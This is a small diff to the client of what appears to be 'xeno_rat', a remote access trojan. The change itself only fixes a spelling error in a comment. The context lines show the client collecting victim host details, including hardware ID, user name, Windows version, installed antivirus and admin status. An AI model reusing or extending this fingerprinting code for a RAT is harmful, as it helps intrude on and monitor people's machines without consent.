@@ -57,7 +57,7 @@ namespace xeno_rat_client
             {
                 return;
             }
-            //get hwid, username etc. seperated by null
+            //get hwid, username etc. separated by null
             string clientversion = "1.8.7";//find a way to get the client version.
             string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
             byte[] data = new byte[0];
